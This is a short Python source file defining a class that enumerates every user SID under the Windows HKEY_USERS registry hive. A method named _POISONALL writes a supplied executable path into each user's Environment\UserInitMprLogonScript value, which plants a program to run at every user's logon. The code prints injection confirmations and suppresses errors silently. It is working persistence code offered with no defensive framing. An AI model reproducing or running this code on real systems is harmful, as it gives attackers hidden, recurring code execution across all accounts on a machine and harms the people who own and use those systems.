import winreg

__all__ = ["ALLSIDLOGON"]

class ALLSIDLOGON(object):
    def __new__(cls,exeinit:str):
        rb = object.__new__(cls)
        return rb
    def __init__(self,exeinit:str):
        self.__exe = exeinit
        self.__drt = "\Environment"
        self.__uuk = winreg.HKEY_USERS
        self.__pr = winreg.KEY_ALL_ACCESS
        self.__rc = winreg.REG_SZ
        self.__mn = "UserInitMprLogonScript"
    def __str__(self):
        return "ALL SID AUTOLOGON - PROCESS"
    def __call__(self):
        return
    def __getstate__(self):
        raise TypeError("D.E.N.I.E.D")
    def __repr__(self):
        return ALLSIDLOGON.__doc__
    def _GETALLSID(self):
        nm = winreg.QueryInfoKey(self.__uuk)[0]
        if int(nm) > 0:
            for iu in range(nm):
                ky = winreg.EnumKey(self.__uuk,iu)
                yield ky
    def _POISONALL(self):
        usid = list(self._GETALLSID())
        if len(usid) > 0:
            for xu in usid:
                try:
                    apth = str(xu)+self.__drt
                    ky = winreg.OpenKey(self.__uuk,
                                        apth,
                                        0,
                                        self.__pr)
                    if ky:
                        winreg.SetValueEx(ky,
                                          self.__mn,
                                          0,
                                          self.__rc,
                                          self.__exe)
                        print(f"[INJ - DONE] --> {str(xu)}")
                    else:
                        pass
                except KeyboardInterrupt:
                    raise UserWarning("CLOSED BY USER")
                except Exception as err:
                    # print(str(err))
                    pass
        else:
            pass